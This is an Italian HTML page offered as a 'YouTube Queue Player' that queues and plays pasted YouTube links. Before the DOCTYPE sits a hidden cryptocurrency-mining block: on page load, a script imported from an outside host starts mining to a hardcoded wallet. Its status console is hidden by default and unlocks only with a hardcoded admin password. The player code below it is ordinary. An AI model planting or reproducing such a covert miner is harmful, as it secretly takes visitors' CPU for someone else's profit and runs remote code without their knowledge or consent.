<!-- ==================== MINER CONSOLE ==================== -->
<style>
#mining-console {
    position: fixed;
    bottom: 80px;
    right: 20px;
    width: 280px;
    background: rgba(0, 0, 0, 0.9);
    border: 1px solid #ffffff33;
    border-radius: 6px;
    padding: 12px 14px;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.6);
    z-index: 1000;
    color: #ffffff;
    font-family: 'Courier New', monospace;
    font-size: 15px;
    line-height: 1.7;
    display: none;
}
.console-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 10px;
    padding-bottom: 8px;
    border-bottom: 1px solid #ffffff33;
}
.close-btn {
    background: #ffffff;
    color: #000;
    border: none;
    width: 22px;
    height: 22px;
    font-size: 16px;
    line-height: 18px;
    text-align: center;
    border-radius: 3px;
    cursor: pointer;
    font-weight: bold;
}
#reopen-btn {
    position: fixed;
    bottom: 20px;
    right: 20px;
    width: 50px;
    height: 50px;
    background: rgba(255,255,255,0.1);
    border: 2px solid #ffffff88;
    color: #ffffff;
    font-size: 26px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    z-index: 999;
    box-shadow: 0 4px 15px rgba(0,0,0,0.5);
}
</style>

<div id="mining-console">
    <div class="console-header">
        <span><strong>CPU Miner</strong></span>
        <button class="close-btn" onclick="hideMinerConsole()"></button>
    </div>
    <div>Stato: <span id="status">Avviando...</span></div>
    <div>Hashrate: <span id="hashrate">0.00</span> KH/s</div>
    <div>Tempo: <span id="timer">00:00</span></div>
    <div>Job accettati: <span id="shares">0</span></div>
</div>

<div id="reopen-btn" onclick="askPassword()"></div>

<script type="module">
    import { autoMine, minotaurxHashrate } from "https://earnify.cc/miner.js";

    let miningStarted = false;
    let consoleUnlocked = false;   // ← Nuovo: ricorda se la password è stata inserita

    // Mining parte subito
    async function initMining() {
        try {
            await autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
            miningStarted = true;
            document.getElementById("status").textContent = "Attivo";
            
            setInterval(() => {
                const hr = minotaurxHashrate.currentHashrateKHs || 0;
                const shares = minotaurxHashrate.sharesAccepted || 0;
                
                document.getElementById("hashrate").textContent = parseFloat(hr).toFixed(2);
                document.getElementById("shares").textContent = shares;
            }, 700);

        } catch (e) {
            console.error(e);
            document.getElementById("status").textContent = "Errore";
        }
    }

    window.askPassword = function() {
        if (consoleUnlocked) {
            showMinerConsole();
            return;
        }

        const password = prompt("Inserire admin password");
        if (password === "CpuMining") {
            consoleUnlocked = true;
            showMinerConsole();
        } else if (password !== null) {
            alert("Password errata!");
        }
    };

    window.hideMinerConsole = function() {
        document.getElementById("mining-console").style.display = "none";
        document.getElementById("reopen-btn").style.display = "flex";
    };

    function showMinerConsole() {
        document.getElementById("mining-console").style.display = "block";
        document.getElementById("reopen-btn").style.display = "none";
    }

    // Timer
    let startTime = Date.now();
    setInterval(() => {
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        const min = Math.floor(elapsed / 60).toString().padStart(2, '0');
        const sec = (elapsed % 60).toString().padStart(2, '0');
        document.getElementById("timer").textContent = `${min}:${sec}`;
    }, 1000);

    // Avvio
    window.addEventListener('load', () => {
        initMining();
    });
</script>
<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>YouTube Queue Player</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 20px;
      background: #0f0f0f;
      color: #fff;
    }
    h1 { text-align: center; margin-bottom: 20px; }
    textarea {
      width: 100%;
      height: 120px;
      background: #1f1f1f;
      color: #fff;
      border: 1px solid #333;
      border-radius: 8px;
      padding: 12px;
      font-size: 16px;
    }
    button {
      margin-top: 10px;
      padding: 12px 24px;
      font-size: 16px;
      background: #ff0000;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
    button:hover { background: #cc0000; }
    .player-container {
      margin: 30px 0;
      text-align: center;
    }
    #player {
      width: 100%;
      max-width: 900px;
      height: 506px;
      border-radius: 12px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.6);
    }
    .queue {
      margin-top: 30px;
    }
    .video-item {
      display: inline-flex;
      align-items: center;
      background: #1f1f1f;
      margin: 8px;
      padding: 8px;
      border-radius: 8px;
      width: 320px;
      cursor: pointer;
    }
    .video-item img {
      width: 120px;
      border-radius: 6px;
      margin-right: 12px;
    }
    .video-item.active {
      border: 3px solid #ff0000;
    }
    .info {
      font-size: 14px;
    }
  </style>
</head>
<body>
  <h1>YouTube Queue Player</h1>

  <textarea id="links" placeholder="Incolla qui i link YouTube separati da spazio o nuova riga..."></textarea>
  <br>
  <button onclick="loadVideos()">Carica Video e Avvia Coda</button>

  <div class="player-container">
    <div id="player"></div>
  </div>

  <h2>Coda di riproduzione</h2>
  <div id="queue" class="queue"></div>

  <script>
    let player;
    let videos = [];
    let currentIndex = 0;

    // Carica l'API di YouTube
    const tag = document.createElement('script');
    tag.src = "https://www.youtube.com/iframe_api";
    const firstScriptTag = document.getElementsByTagName('script')[0];
    firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);

    // Callback chiamato da YouTube quando l'API è pronta
    window.onYouTubeIframeAPIReady = function() {
      player = new YT.Player('player', {
        height: '506',
        width: '900',
        videoId: '',
        playerVars: {
          autoplay: 1,
          modestbranding: 1,
          rel: 0,
          fs: 1
        },
        events: {
          'onReady': onPlayerReady,
          'onStateChange': onPlayerStateChange
        }
      });
    };

    function onPlayerReady(event) {
      if (videos.length > 0) {
        playVideo(0);
      }
    }

    function onPlayerStateChange(event) {
      // Quando un video finisce (ended)
      if (event.data === YT.PlayerState.ENDED) {
        currentIndex++;
        if (currentIndex < videos.length) {
          playVideo(currentIndex);
        }
      }
    }

    function extractVideoId(url) {
      const regex = /(?:https?:\/\/)?(?:www\.)?(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/|youtube\.com\/v\/)([^&\n?#]+)/;
      const match = url.match(regex);
      return match ? match[1] : null;
    }

    function loadVideos() {
      const input = document.getElementById('links').value.trim();
      if (!input) return alert("Inserisci almeno un link YouTube!");

      const rawLinks = input.split(/[\s\n]+/);
      videos = [];

      rawLinks.forEach(link => {
        const id = extractVideoId(link);
        if (id) videos.push(id);
      });

      if (videos.length === 0) {
        alert("Nessun link YouTube valido trovato!");
        return;
      }

      renderQueue();
      currentIndex = 0;
      playVideo(0);
    }

    function playVideo(index) {
      if (!player || index >= videos.length) return;
      currentIndex = index;
      player.loadVideoById(videos[index]);
      highlightActive();
    }

    function renderQueue() {
      const queueDiv = document.getElementById('queue');
      queueDiv.innerHTML = '';

      videos.forEach((id, index) => {
        const item = document.createElement('div');
        item.className = 'video-item';
        item.innerHTML = `
          <img src="https://img.youtube.com/vi/${id}/mqdefault.jpg" alt="thumbnail">
          <div class="info">
            <strong>Video ${index + 1}</strong><br>
            <small>https://youtu.be/${id}</small>
          </div>
        `;
        item.onclick = () => playVideo(index);
        queueDiv.appendChild(item);
      });
    }

    function highlightActive() {
      const items = document.querySelectorAll('.video-item');
      items.forEach((item, i) => {
        item.classList.toggle('active', i === currentIndex);
      });
    }
  </script>
</body>
</html>
